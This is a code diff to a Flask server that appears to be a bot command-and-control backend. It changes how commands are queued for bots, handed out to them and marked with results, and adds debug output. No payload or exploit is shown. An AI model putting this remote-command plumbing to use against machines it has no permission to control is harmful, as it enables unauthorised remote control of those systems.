@@ -262,20 +262,17 @@ def botpush(target):
         print(cmd)
 
         # Actually push the command to the bot. If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
-        if len(query_bot.cmds) < 1:
-            try:
-                query_bot.cmds.append(cmd)
-                db.session.add(cmd)
-                db.session.commit()
+        try:
+            query_bot.cmds.append(cmd)
+            db.session.add(cmd)
+            db.session.commit()
 
-                print("[DEBUG] Command staged")
+            print("[DEBUG] Command staged")
 
-                return jsonify({'result': 'Command staged'})
+            return jsonify({'result': 'Command staged'})
 
-            except Exception as e:
-                return jsonify({'error': 'Error occurred while staging command'})
-        else:
-            return jsonify({'error': 'Only one command can be staged'})
+        except Exception as e:
+            return jsonify({'error': 'Error occurred while staging command'})
 
     except Exception as e:
         return jsonify({ 'error': '[-] Pushing command for bot failed. ' + str(e) }) 
@@ -309,9 +306,13 @@ def bottask(bot_id):
         except Exception as e:
             return jsonify({'result': 'fail', 'error' : '[-] There are no commands for you'})
 
-        # Try getting commands, from the oldest staged command to the lastest staged command. 
+        # Get command for the bot to run. Only getting the latest command.
         try:
-            command = query_bot.cmds[0]
+            command = query_bot.cmds[len(query_bot.cmds)-1]
+
+            if command.result != '':
+                return jsonify({'result': 'fail', 'error':'[-] There are no commands available'})
+
         except Exception as e:
             return jsonify({'result': 'fail', 'error': '[-] There are no commands available'})
 
@@ -354,6 +355,9 @@ def botresult(bot_id):
                 query_bot = Bot.query.filter_by(id=bot_id).first()
                 command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
                 command.set_result(result)
+
+                #query_bot.cmds.clear()
+
                 db.session.commit()
                 
                 # This needs to be changed 
@@ -366,10 +370,11 @@ def botresult(bot_id):
             try:
                 query_bot = Bot.query.filter_by(id=bot_id).first()
                 command = Command.query.filter_by(bot_id=bot_id).order_by(Command.id.desc()).first()
+                print("[DEBUG] command info = ", command.get_info())
                 
                 result = command.result
 
-                query_bot.cmds.remove(command)
+                #query_bot.cmds.remove(command)
                 db.session.commit()
 
                 if result is None:
